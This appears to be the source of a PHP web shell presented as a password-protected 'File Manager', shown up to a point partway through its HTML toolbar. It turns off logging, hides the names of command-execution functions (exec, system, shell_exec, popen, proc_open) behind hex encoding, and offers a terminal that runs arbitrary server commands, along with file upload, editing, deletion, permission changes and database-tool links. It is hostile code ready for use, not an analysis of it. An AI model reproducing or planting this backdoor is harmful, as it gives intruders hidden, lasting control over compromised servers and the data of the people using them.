<?php
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);

if (session_status() === PHP_SESSION_NONE) session_start();

$hashed_password = '$2y$10$ObqlJnHJLtsi5g6w/QSrdul0kXeq.JkJbgF9JdeDL9lpBZU5j3CVG';

if (isset($_GET['logout'])) { session_destroy(); header('Location: ' . $_SERVER['PHP_SELF']); exit; }

if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (password_verify($_POST['password'], $hashed_password)) {
            $_SESSION['logged_in'] = true;
            $_SESSION['login_time'] = time();
            header('Location: ' . $_SERVER['PHP_SELF']); exit;
        } else { $msg_login = "Incorrect password. Please try again."; }
    }
?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width,initial-scale=1">
        <title>Sign In — File Manager</title>
        <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
        <style>
        *{font-family:'Segoe UI',system-ui,-apple-system,sans-serif}
        body{background:#f3f3f3;display:flex;align-items:center;justify-content:center;min-height:100vh}
        </style>
    </head>
    <body>
        <div style="width:360px">
            <!-- Window chrome -->
            <div style="background:#fff;border:1px solid #c0c0c0;box-shadow:0 4px 20px rgba(0,0,0,.12)">
                <!-- Title bar -->
                <div style="background:linear-gradient(180deg,#f0f0f0,#e4e4e4);border-bottom:1px solid #c0c0c0;padding:8px 12px;display:flex;align-items:center;gap:8px">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="#0078d4"><path d="M3 3h8v8H3zm10 0h8v8h-8zM3 13h8v8H3zm10 0h8v8h-8z"/></svg>
                    <span style="font-size:12px;color:#333;font-weight:600">File Manager</span>
                        <div style="margin-left:auto;display:flex;gap:4px">
                            <div style="width:12px;height:12px;border-radius:50%;background:#ffbd2e"></div>
                            <div style="width:12px;height:12px;border-radius:50%;background:#27c93f"></div>
                        </div>
                </div>
                <div style="padding:28px 28px 24px">
                    <div style="display:flex;align-items:center;gap:10px;margin-bottom:20px">
                        <div style="width:40px;height:40px;background:#0078d4;border-radius:50%;display:flex;align-items:center;justify-content:center">
                            <svg width="22" height="22" fill="white" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4S14.21 4 12 4 8 5.79 8 8s1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
                        </div>
                        <div>
                            <p style="font-size:14px;font-weight:600;color:#1a1a1a;margin:0">Brotherline in here</p>
                            <p style="font-size:11px;color:#666;margin:0">Enter password to continue</p>
                        </div>
                    </div>
                    <?php if (isset($msg_login)): ?>
                    <div style="background:#fef2f2;border:1px solid #fca5a5;border-radius:4px;padding:8px 12px;margin-bottom:14px;font-size:12px;color:#b91c1c;display:flex;align-items:center;gap:6px">
                        <svg width="14" height="14" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd"/></svg>
                        <?= htmlspecialchars($msg_login) ?>
                    </div>
                    <?php endif; ?>
                        <form method="POST" action="<?= htmlspecialchars($_SERVER['PHP_SELF']) ?>">
                            <input type="password" name="password" autofocus autocomplete="off" required
                            placeholder="Password"
                            style="width:100%;border:1px solid #aaa;padding:7px 10px;font-size:13px;border-radius:3px;outline:none;box-sizing:border-box;margin-bottom:12px"
                            onfocus="this.style.borderColor='#0078d4'" onblur="this.style.borderColor='#aaa'">
                            <button type="submit"
                            style="width:100%;background:#0078d4;color:#fff;border:none;padding:8px;font-size:13px;font-weight:600;border-radius:3px;cursor:pointer"
                            onmouseover="this.style.background='#106ebe'" onmouseout="this.style.background='#0078d4'">
                            Sign in
                            </button>
                        </form>
                    <p style="font-size:10px;color:#999;text-align:center;margin-top:16px"><?= $_SERVER['REMOTE_ADDR'] ?> &nbsp;·&nbsp; <?= substr(session_id(),0,10) ?>…</p>
                </div>
            </div>
        </div>
    </body>
</html>
<?php exit; }

// ─── Function declarations (needed before use) ───────────────────────────────
function decrypt_hex($y){$n='';for($i=0;$i<strlen($y)-1;$i+=2)$n.=chr(hexdec($y[$i].$y[$i+1]));return $n;}
function hx($n){$y='';for($i=0;$i<strlen($n);$i++)$y.=dechex(ord($n[$i]));return $y;}
function fullName($v){return strlen($v)>45?substr($v,0,45).'…':$v;}
function clean_url(){return parse_url($_SERVER['REQUEST_URI'],PHP_URL_PATH);}
function refreshPages(){echo '<meta http-equiv="refresh" content="0;url=?d='.hx($GLOBALS['fungsi'][0]()).'">';}
function formatSize($b){$t=['B','KB','MB','GB','TB'];for($i=0;$b>=1024&&$i<4;$b/=1024,$i++);return round($b,1).' '.$t[$i];}
function delete_recursive_directory($dir){
    if(!is_dir($dir))return unlink($dir)||!file_exists($dir);
    array_map('delete_recursive_directory',glob($dir.DIRECTORY_SEPARATOR.'{*,.[!.]*}',GLOB_BRACE|GLOB_NOSORT));
    return rmdir($dir);
}
function windowsDriver(){foreach(range('A','Z') as $d){if(is_dir($d.":/"))echo "<a href='?d=".hx($d.":/")."' class='bc-link'>[$d]</a> ";}}
function perms($file){
    $perms=@$GLOBALS['fungsi'][6]($file);
    if($perms===false||$perms===0){$stat=@stat($file);if($stat&&isset($stat['mode'])&&$stat['mode']>0)$perms=$stat['mode'];}
    if($perms===false||$perms===0){
        $r=@shell_exec('stat -c "%a %F" '.escapeshellarg(realpath($file)?:$file).' 2>/dev/null');
        if($r){$p=explode(' ',trim($r),2);$oct=str_pad($p[0]??'000',3,'0',STR_PAD_LEFT);
            $t=strpos($p[1]??'','directory')!==false?'d':'-';
            $m=['0'=>'---','1'=>'--x','2'=>'-w-','3'=>'-wx','4'=>'r--','5'=>'r-x','6'=>'rw-','7'=>'rwx'];
            return $t.($m[$oct[0]]??'---').($m[$oct[1]]??'---').($m[$oct[2]]??'---');}
        return '?????????';
    }
    if(($perms&0xC000)==0xC000)$i='s';elseif(($perms&0xA000)==0xA000)$i='l';elseif(($perms&0x8000)==0x8000)$i='-';
    elseif(($perms&0x6000)==0x6000)$i='b';elseif(($perms&0x4000)==0x4000)$i='d';
    elseif(($perms&0x2000)==0x2000)$i='c';elseif(($perms&0x1000)==0x1000)$i='p';else $i='u';
    $i.=(($perms&0x0100)?'r':'-');$i.=(($perms&0x0080)?'w':'-');
    $i.=(($perms&0x0040)?(($perms&0x0800)?'s':'x'):(($perms&0x0800)?'S':'-'));
    $i.=(($perms&0x0020)?'r':'-');$i.=(($perms&0x0010)?'w':'-');
    $i.=(($perms&0x0008)?(($perms&0x0400)?'s':'x'):(($perms&0x0400)?'S':'-'));
    $i.=(($perms&0x0004)?'r':'-');$i.=(($perms&0x0002)?'w':'-');
    $i.=(($perms&0x0001)?(($perms&0x0200)?'t':'x'):(($perms&0x0200)?'T':'-'));
    return $i;
}
function terminal_cmd($in,$re=false){
    if(!isset($_SESSION['cwd']))$_SESSION['cwd']=getcwd();
    $in=trim($in);
    if(preg_match('/^\s*cd\s+(.+)$/',$in,$m)){
        $orig=getcwd();
        if(@chdir($_SESSION['cwd'])&&@chdir(trim($m[1]))){$_SESSION['cwd']=getcwd();chdir($orig);return "Changed to: ".$_SESSION['cwd'];}
        chdir($orig);return "cd: no such directory: ".trim($m[1]);
    }
    $orig=getcwd();chdir($_SESSION['cwd']);$out=null;$cmd=$in.($re?" 2>&1":"");
    try{
        if(function_exists("exec")){$arr=[];@$GLOBALS['fungsi'][16]($cmd,$arr);$out=implode("\n",$arr);}
        elseif(function_exists("passthru")){ob_start();@$GLOBALS['fungsi'][17]($cmd);$out=ob_get_clean();}
        elseif(function_exists("system")){ob_start();@$GLOBALS['fungsi'][18]($cmd);$out=ob_get_clean();}
        elseif(function_exists("shell_exec")){$out=$GLOBALS['fungsi'][19]($cmd);}
        elseif(function_exists("popen")&&function_exists("pclose")){
            if(is_resource($f=@$GLOBALS['fungsi'][20]($cmd,"r"))){$out="";while(!feof($f))$out.=fread($f,1024);$GLOBALS['fungsi'][21]($f);}
        }elseif(function_exists("proc_open")){
            $pipes=[];$proc=proc_open($cmd,[1=>["pipe","w"],2=>["pipe","w"]],$pipes,$_SESSION['cwd']);
            if(is_resource($proc)){$out=stream_get_contents($pipes[1]);fclose($pipes[1]);fclose($pipes[2]);proc_close($proc);}
        }
    }catch(Exception $e){chdir($orig);return "Error: ".$e->getMessage();}
    chdir($orig);if($out!==null)$out=trim(str_replace(["\r\n","\r"],"\n",$out));return $out;
}
function compressToZip($src,$zip_name){
    if(!file_exists($src))return false;$zip=new ZipArchive();
    if($zip->open($zip_name,ZipArchive::CREATE|ZipArchive::OVERWRITE)!==TRUE)return false;
    $src=str_replace('\\','/',realpath($src));
    if(is_file($src))$zip->addFile($src,basename($src));
    elseif(is_dir($src)){$root=dirname($src).'/';
        $files=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($src),RecursiveIteratorIterator::LEAVES_ONLY);
        foreach($files as $f){if(!$f->isDir())$zip->addFile($f->getRealPath(),substr($f->getRealPath(),strlen($root)));}}
    return $zip->close();
}
function extractFromZip($src,$dest){
    if(!file_exists($src)||!is_dir($dest))return false;
    $zip=new ZipArchive;if($zip->open($src)===TRUE){$r=$zip->extractTo($dest);$zip->close();return $r;}return false;
}
function file_ext_icon($file){
    $ext=strtolower(pathinfo($file,PATHINFO_EXTENSION));
    $mime=@mime_content_type($file)?:'';
    if(in_array($mime,['image/png','image/jpeg','image/gif','image/webp','image/svg+xml']))
        return '<svg class="icon-file" width="16" height="16" fill="#c07e23" viewBox="0 0 24 24"><path d="M8.5 13.5l2.5-3.25 2 2.5 2.5-3.5 3.5 4.75H5L8.5 13.5zM21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2z"/></svg>';
    if(in_array($ext,['php','html','htm']))
        return '<svg class="icon-file" width="16" height="16" fill="#0078d4" viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zm-1 1.5L18.5 9H13V3.5zM8 17l-2-2 2-2 1 1-1 1 1 1-1 1zm8 0l-1-1 1-1-1-1 1-1 2 2-2 2zm-3.5-6l-2 6h-1l2-6h1z"/></svg>';
    if(in_array($ext,['js','ts','jsx','tsx','vue','css','scss']))
        return '<svg class="icon-file" width="16" height="16" fill="#e8a000" viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zm-1 1.5L18.5 9H13V3.5z"/></svg>';
    if(in_array($ext,['zip','rar','7z','tar','gz']))
        return '<svg class="icon-file" width="16" height="16" fill="#7c3aed" viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zm-1 1.5L18.5 9H13V3.5z"/></svg>';
    if($ext==='pdf')
        return '<svg class="icon-file" width="16" height="16" fill="#dc2626" viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zm-1 1.5L18.5 9H13V3.5z"/></svg>';
    if(in_array($ext,['txt','log','md','csv','xml','json','ini','cfg','conf']))
        return '<svg class="icon-file" width="16" height="16" fill="#555" viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zm-1 1.5L18.5 9H13V3.5zM8 13h8v1.5H8V13zm0 3h6v1.5H8V16zm0-6h3v1.5H8V10z"/></svg>';
    return '<svg class="icon-file" width="16" height="16" fill="#777" viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zm-1 1.5L18.5 9H13V3.5z"/></svg>';
}

$Array=['676574637764','676c6f62','69735f646972','69735f66696c65','69735f7772697461626c65','69735f7265616461626c65','66696c657065726d73','66696c65','7068705f756e616d65','6765745f63757272656e745f75736572','68746d6c7370656369616c6368617273','66696c655f6765745f636f6e74656e7473','6d6b646972','746f756368','6368646972','72656e616d65','65786563','7061737374687275','73797374656d','7368656c6c5f65786563','706f70656e','70636c6f7365','73747265616d5f6765745f636f6e74656e7473','70726f635f6f70656e','756e6c696e6b','726d646972','666f70656e','66636c6f7365','66696c655f7075745f636f6e74656e7473','6d6f76655f75706c6f616465645f66696c65','63686d6f64','7379735f6765745f74656d705f646972','6261736536345F6465636F6465','6261736536345F656E636F6465'];
for($i=0;$i<count($Array);$i++)$fungsi[]=decrypt_hex($Array[$i]);

if(isset($_GET['d'])){$fungsi[14](decrypt_hex($_GET['d']));}

$get_cwd = $fungsi[0]();
$file_manager = $fungsi[1]("{.[!.],}*", GLOB_BRACE) ?: [];
$parent = dirname($get_cwd);
?>
<!DOCTYPE html>
<html lang="en" data-theme="light">
    <head>
        <meta charset="UTF-8">
        <meta name="robots" content="noindex,nofollow">
        <meta name="viewport" content="width=device-width,initial-scale=1">
        <title>File Manager — <?= htmlspecialchars($_SERVER['SERVER_NAME']) ?></title>
        <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
        <style>
            /* ─── CSS Variables ─────────────────────────────────────────── */
            :root {
            --bg:          #f3f3f3;
            --bg-panel:    #ffffff;
            --bg-sidebar:  #f5f5f5;
            --bg-toolbar:  #f5f5f5;
            --bg-titlebar: linear-gradient(180deg,#f0f0f0,#e8e8e8);
            --bg-ribbon:   #fafafa;
            --bg-header:   #f0f0f0;
            --bg-hover:    #cce8ff;
            --bg-modal:    #ffffff;
            --bg-input:    #ffffff;
            --bg-tag:      #e8f0f8;
            --border:      #d0d0d0;
            --border-input:#aaaaaa;
            --text:        #1a1a1a;
            --text-sub:    #555555;
            --text-muted:  #888888;
            --text-link:   #0078d4;
            --accent:      #0078d4;
            --accent-h:    #106ebe;
            --sel-bg:      #cce8ff;
            --sel-border:  #99d1ff;
            --perm-ok:     #16a34a;
            --perm-no:     #dc2626;
            --shadow:      0 2px 8px rgba(0,0,0,.12);
            --shadow-modal:0 8px 32px rgba(0,0,0,.18);
            }
            [data-theme="dark"] {
            --bg:          #202020;
            --bg-panel:    #2b2b2b;
            --bg-sidebar:  #252525;
            --bg-toolbar:  #2d2d2d;
            --bg-titlebar: linear-gradient(180deg,#3c3c3c,#323232);
            --bg-ribbon:   #2d2d2d;
            --bg-header:   #383838;
            --bg-hover:    #2c4a6b;
            --bg-modal:    #2b2b2b;
            --bg-input:    #3a3a3a;
            --bg-tag:      #2c3f55;
            --border:      #454545;
            --border-input:#666666;
            --text:        #e8e8e8;
            --text-sub:    #aaaaaa;
            --text-muted:  #777777;
            --text-link:   #5eb3ff;
            --accent:      #0078d4;
            --accent-h:    #2998ff;
            --sel-bg:      #1a3d5c;
            --sel-border:  #2c6099;
            --perm-ok:     #4ade80;
            --perm-no:     #f87171;
            --shadow:      0 2px 8px rgba(0,0,0,.4);
            --shadow-modal:0 8px 32px rgba(0,0,0,.5);
            }

            /* ─── Base ───────────────────────────────────────────────────── */
            *, *::before, *::after { box-sizing: border-box; }
            * { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
            html, body { height: 100%; margin: 0; background: var(--bg); color: var(--text); transition: background .2s, color .2s; }
            input[type=number]::-webkit-inner-spin-button,
            input[type=number]::-webkit-outer-spin-button { -webkit-appearance:none; margin:0; }
            input[type=number] { -moz-appearance:textfield; }
            a { color: var(--text-link); text-decoration: none; }

            /* ─── App Shell ──────────────────────────────────────────────── */
            .app { display:flex; flex-direction:column; height:100vh; overflow:hidden; }

            /* Title bar */
            .titlebar {
            background: var(--bg-titlebar);
            border-bottom: 1px solid var(--border);
            padding: 5px 10px;
            display: flex; align-items: center; gap: 8px;
            flex-shrink: 0; user-select: none;
            }
            .titlebar-title { font-size: 12px; font-weight: 600; color: var(--text); }
            .titlebar-right { margin-left: auto; display: flex; align-items: center; gap: 12px; }
            .titlebar-info { font-size: 11px; color: var(--text-muted); }

            /* Theme toggle */
            .theme-btn {
            background: none; border: 1px solid var(--border); border-radius: 14px;
            padding: 3px 10px; cursor: pointer; font-size: 11px; color: var(--text-sub);
            display: flex; align-items: center; gap: 5px; transition: all .15s;
            }
            .theme-btn:hover { background: var(--bg-hover); border-color: var(--accent); }

            /* Sign out */
            .signout-btn {
            background: none; border: none; cursor: pointer; font-size: 11px;
            color: var(--text-muted); display: flex; align-items: center; gap: 4px;
            padding: 3px 6px; border-radius: 3px; transition: color .15s;
            }
            .signout-btn:hover { color: #e11d48; }

            /* ─── Ribbon ─────────────────────────────────────────────────── */
            .ribbon {
            background: var(--bg-ribbon);
            border-bottom: 1px solid var(--border);
            padding: 4px 8px;
            display: flex; align-items: center; gap: 2px; flex-shrink: 0; flex-wrap: wrap;
            }
            .ribbon-sep { width: 1px; height: 36px; background: var(--border); margin: 0 4px; }
            .rbtn {
            display: flex; flex-direction: column; align-items: center; gap: 1px;
            padding: 4px 10px; border-radius: 3px; cursor: pointer; border: 1px solid transparent;
            font-size: 11px; color: var(--text-sub); background: none; text-decoration: none;
            transition: background .1s, border-color .1s; white-space: nowrap; line-height:1.3;
            }
            .rbtn:hover { background: var(--bg-hover); border-color: var(--sel-border); color: var(--text); }
            .rbtn svg { flex-shrink: 0; }
            label.rbtn { cursor: pointer; }

            /* ─── Address bar ────────────────────────────────────────────── */
            .addrbar {
            background: var(--bg-panel);
            border-bottom: 1px solid var(--border);
            padding: 4px 10px;
            display: flex; align-items: center; gap: 4px; flex-shrink: 0;
            }
            .addrbar-inner {
            flex: 1; background: var(--bg-input); border: 1px solid var(--border-input);
            border-radius: 3px; padding: 3px 10px; display: flex; align-items: center; gap: 2px;
            min-width: 0; height: 26px;
            }
            .bc-link {
            font-size: 12px; color: var(--text); padding: 1px 4px; border-radius: 2px;
            white-space: nowrap; transition: background .1s;
            }
            .bc-link:hover { background: var(--bg-hover); color: var(--text-link); }
            .bc-sep { color: var(--text-muted); font-size: 12px; padding: 0 1px; }
            .bc-current { font-size: 12px; color: var(--text); font-weight: 600; padding: 1px 4px; }

            /* ─── Main layout ────────────────────────────────────────────── */
            .main { display: flex; flex: 1; overflow: hidden; }

            /* Sidebar */
            .sidebar {
            width: 200px; flex-shrink: 0;
            background: var(--bg-sidebar);
            border-right: 1px solid var(--border);
            overflow-y: auto; padding: 8px 0;
            }
            .sidebar-section { padding: 0 0 8px; }
            .sidebar-heading {
            font-size: 11px; font-weight: 700; color: var(--text-muted);
            padding: 4px 14px 2px; text-transform: uppercase; letter-spacing: .5px;
            }
            .sidebar-item {
            display: flex; align-items: center; gap: 7px;
            padding: 5px 14px; font-size: 12px; color: var(--text-sub);
            cursor: pointer; border-radius: 0; text-decoration: none; transition: background .1s;
            border-left: 2px solid transparent;
            }
            .sidebar-item:hover { background: var(--bg-hover); color: var(--text); }
            .sidebar-item.active { background: var(--sel-bg); border-left-color: var(--accent); color: var(--text); }

            /* Content pane */
            .content { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
            .content-table-wrap { flex: 1; overflow: auto; }

            /* ─── File Table ─────────────────────────────────────────────── */
            .file-table { width: 100%; border-collapse: collapse; }
            .file-table thead tr {
            background: var(--bg-header);
            border-bottom: 1px solid var(--border);
            position: sticky; top: 0; z-index: 2;
            }
            .file-table th {
            font-size: 12px; font-weight: 600; color: var(--text-sub);
            padding: 6px 12px; text-align: left; white-space: nowrap;
            border-right: 1px solid var(--border); user-select: none;
            }
            .file-table th:last-child { border-right: none; }
            .file-table td {
            font-size: 12px; color: var(--text);
            padding: 4px 12px;
            border-bottom: 1px solid color-mix(in srgb, var(--border) 50%, transparent);
            white-space: nowrap;
            }
            .file-table tr.frow:hover td { background: var(--bg-hover); }
            .file-table tr.frow.selected td { background: var(--sel-bg); outline: 1px solid var(--sel-border); }
            .fname-cell { display: flex; align-items: center; gap: 7px; }
            .icon-file { flex-shrink: 0; }
            .perm-ok { color: var(--perm-ok); }
            .perm-no { color: var(--perm-no); }

            /* Action buttons in table */
            .act-btn {
            background: none; border: none; cursor: pointer; padding: 2px 5px;
            border-radius: 3px; color: var(--text-muted); transition: background .1s, color .1s;
            font-size: 11px;
            }
            .act-btn:hover { background: var(--bg-hover); color: var(--text); }
            .act-btn.del:hover { background: #fee2e2; color: #dc2626; }
            [data-theme="dark"] .act-btn.del:hover { background: #3f1a1a; color: #f87171; }

            /* ─── Status bar ─────────────────────────────────────────────── */
            .statusbar {
            background: var(--bg-toolbar); border-top: 1px solid var(--border);
            padding: 3px 14px; display: flex; justify-content: space-between;
            font-size: 11px; color: var(--text-muted); flex-shrink: 0;
            }

            /* ─── Modals ─────────────────────────────────────────────────── */
            .modal-overlay {
            position: fixed; inset: 0; background: rgba(0,0,0,.45); z-index: 100;
            display: flex; align-items: center; justify-content: center;
            }
            .modal-overlay.hidden { display: none; }
            .modal-box {
            background: var(--bg-modal); border: 1px solid var(--border);
            border-radius: 6px; box-shadow: var(--shadow-modal);
            overflow: hidden; min-width: 300px;
            }
            .modal-titlebar {
            background: var(--accent); padding: 9px 14px;
            display: flex; align-items: center; justify-content: space-between;
            }
            .modal-titlebar span { color: #fff; font-size: 13px; font-weight: 600; }
            .modal-close {
            background: none; border: none; color: rgba(255,255,255,.7);
            font-size: 18px; cursor: pointer; line-height: 1; padding: 0 2px;
            transition: color .1s;
            }
            .modal-close:hover { color: #fff; }
            .modal-body { padding: 16px 18px; display: flex; flex-direction: column; gap: 12px; }
            .modal-footer { display: flex; justify-content: flex-end; gap: 8px; padding: 12px 18px; border-top: 1px solid var(--border); }
            .btn-primary {
            background: var(--accent); color: #fff; border: none;
            padding: 6px 18px; font-size: 13px; font-weight: 600; border-radius: 3px; cursor: pointer;
            transition: background .1s;
            }
            .btn-primary:hover { background: var(--accent-h); }
            .btn-secondary {
            background: none; color: var(--text); border: 1px solid var(--border);
            padding: 6px 16px; font-size: 13px; border-radius: 3px; cursor: pointer;
            transition: background .1s;
            }
            .btn-secondary:hover { background: var(--bg-hover); }
            .fm-input {
            width: 100%; border: 1px solid var(--border-input); background: var(--bg-input);
            color: var(--text); padding: 6px 10px; font-size: 13px; border-radius: 3px; outline: none;
            }
            .fm-input:focus { border-color: var(--accent); box-shadow: 0 0 0 2px color-mix(in srgb, var(--accent) 20%, transparent); }
            .field-label { font-size: 11px; color: var(--text-muted); margin-bottom: 3px; }
            .info-box {
            background: var(--bg-tag); border: 1px solid var(--border); border-radius: 3px;
            padding: 7px 10px; font-size: 11px; color: var(--text-sub);
            }

            /* Terminal */
            .terminal-box { background: #1e1e1e; color: #d4d4d4; font-family: 'Cascadia Code','Consolas',monospace; }
            .terminal-output { width:100%; height: 280px; overflow:auto; padding:12px; font-size:12px; white-space:pre; }
            .terminal-input-row { display:flex; align-items:center; gap:8px; padding:6px 12px; border-top:1px solid #3a3a3a; }
            .terminal-input-row input { flex:1; background:transparent; border:none; outline:none; color:#d4d4d4; font-family:inherit; font-size:12px; }
            .terminal-prompt { color:#64d18a; font-size:12px; user-select:none; }
            .terminal-run-btn { background:none; border:none; color:#666; cursor:pointer; font-size:11px; padding:3px 8px; border-radius:3px; }
            .terminal-run-btn:hover { color:#64d18a; }

            /* Code editor */
            .code-editor-wrap { background: var(--bg-modal); }
            .code-editor-header {
            background: var(--bg-header); border-bottom:1px solid var(--border);
            padding: 8px 14px; display:flex; align-items:center; justify-content:space-between;
            }
            .code-textarea {
            width:100%; background: var(--bg-input); color: var(--text);
            font-family:'Cascadia Code','Consolas',monospace; font-size:12px;
            padding:12px; border:none; outline:none; resize:none; min-height:65vh;
            tab-size:4; line-height:1.5;
            }

            /* Upload progress */
            #upload-filename { font-size:11px; color:var(--text-muted); max-width:120px; overflow:hidden; text-overflow:ellipsis; }

            /* Scrollbar */
            ::-webkit-scrollbar { width:8px; height:8px; }
            ::-webkit-scrollbar-track { background: var(--bg); }
            ::-webkit-scrollbar-thumb { background: var(--border); border-radius:4px; }
            ::-webkit-scrollbar-thumb:hover { background: var(--text-muted); }

            /* ─── Context Menu ───────────────────────────────────────────── */
            .ctx-btn {
            display: flex; align-items: center; gap: 9px;
            width: 100%; padding: 7px 16px; font-size: 13px;
            color: var(--text); background: none; border: none; cursor: pointer;
            text-align: left; transition: background .1s;
            }
            .ctx-btn:hover { background: var(--bg-hover); }
            .ctx-btn-danger { color: #dc2626; }
            .ctx-btn-danger:hover { background: #fee2e2; color: #b91c1c; }
            [data-theme="dark"] .ctx-btn-danger:hover { background: #3f1a1a; color: #f87171; }
            .ctx-btn-paste { color: var(--accent); }
            /* Cut visual: faded row */
            tr.frow.is-cut td { opacity: .45; }
        </style>
    </head>
    <body>
        <div class="app">

            <!-- ═══ TITLE BAR ═══════════════════════════════════════════════ -->
            <div class="titlebar">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="#0078d4"><path d="M3 3h8v8H3zm10 0h8v8h-8zM3 13h8v8H3zm10 0h8v8h-8z"/></svg>
                <span class="titlebar-title">File Manager</span>
                <div class="titlebar-right">
                    <span class="titlebar-info"><?= htmlspecialchars($_SERVER['SERVER_NAME']) ?></span>
                    <span class="titlebar-info">·</span>
                    <span class="titlebar-info">PHP <?= PHP_VERSION ?></span>
                    <span class="titlebar-info">·</span>
                    <span class="titlebar-info"><?= $fungsi[9]() ?></span>
                    <span class="titlebar-info">·</span>
                    <span class="titlebar-info"><?= htmlspecialchars($_SERVER['SERVER_ADDR']) ?></span>

                    <!-- Theme toggle -->
                    <button class="theme-btn" id="theme-toggle" title="Toggle dark/light mode">
                        <svg id="theme-icon-moon" width="13" height="13" fill="currentColor" viewBox="0 0 24 24"><path d="M21 12.79A9 9 0 1111.21 3a7 7 0 009.79 9.79z"/></svg>
                        <svg id="theme-icon-sun" width="13" height="13" fill="currentColor" viewBox="0 0 24 24" style="display:none"><path d="M12 7c-2.76 0-5 2.24-5 5s2.24 5 5 5 5-2.24 5-5-2.24-5-5-5zM2 13h2v-2H2v2zm18 0h2v-2h-2v2zM11 2v2h2V2h-2zm0 18v2h2v-2h-2zM5.64 6.36l-1.41-1.41-1.42 1.42 1.41 1.41 1.42-1.42zm14.14 11.31l-1.41-1.41-1.42 1.42 1.41 1.41 1.42-1.42zM5.64 17.64L4.22 19.07l1.41 1.41 1.42-1.42-1.41-1.42zM19.78 4.93l-1.41 1.41 1.42 1.42 1.41-1.41-1.42-1.42z"/></svg>
                        <span id="theme-label">Dark</span>
                    </button>

                    <button class="signout-btn" onclick="location='?logout'">
                        <svg width="13" height="13" fill="currentColor" viewBox="0 0 24 24"><path d="M17 7l-1.41 1.41L18.17 11H8v2h10.17l-2.58 2.58L17 17l5-5zM4 5h8V3H4c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h8v-2H4V5z"/></svg>
                        Sign out
                    </button>
                </div>
            </div>

            <!-- ═══ RIBBON ══════════════════════════════════════════════════ -->
            <div class="ribbon">
                <!-- Upload -->
                <form action="" method="post" enctype="multipart/form-data" style="display:flex;align-items:center;gap:2px">
                    <input type="file" name="gecko-upload" id="file-upload" style="display:none">
                        <label for="file-upload" class="rbtn">
                            <svg width="22" height="22" fill="#0078d4" viewBox="0 0 24 24"><path d="M9 16h6v-6h4l-7-7-7 7h4zm-4 2h14v2H5z"/></svg>
                            Upload
                        </label>
                    <button type="submit" name="gecko-up-submit" id="upload-submit-btn" class="rbtn" style="display:none">
                        <svg width="22" height="22" fill="#16a34a" viewBox="0 0 24 24"><path d="M9 16h6v-6h4l-7-7-7 7h4zm-4 2h14v2H5z"/></svg>
                        Send
                    </button>
                    <span id="upload-filename" style="display:none"></span>
                </form>
                <div class="ribbon-sep"></div>

                <!-- New Folder -->
                <button class="rbtn" id="btn-new-folder">
                    <svg width="22" height="22" fill="#d97706" viewBox="0 0 24 24"><path d="M20 6h-8l-2-2H4c-1.11 0-2 .89-2 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V8c0-1.11-.89-2-2-2zm-1 8h-3v3h-2v-3h-3v-2h3V9h2v3h3v2z"/></svg>
                    New Folder
                </button>

                <!-- New File -->
                <button class="rbtn" id="btn-new-file">
                    <svg width="22" height="22" fill="#555" viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zm-1 7V3.5L18.5 9H13zm-2 8v-3H9v-2h2v-3h2v3h2v2h-2v3h-2z"/></svg>
                    New File
                </button>

                <div class="ribbon-sep"></div>

                <!-- Terminal -->
                <a href="?d=<?= hx($get_cwd) ?>&terminal=1" class="rbtn">
                    <svg width="22" height="22" fill="#1e293b" viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V6h16v12zM6 8l4 4-4 4 1.4 1.4L12.8 12 7.4 6.6 6 8zm5 8h6v-2h-6v2z"/></svg>
                    Terminal
                </a>

                <!-- Adminer -->
                <a href="?d=<?= hx($get_cwd) ?>&adminer" class="rbtn">
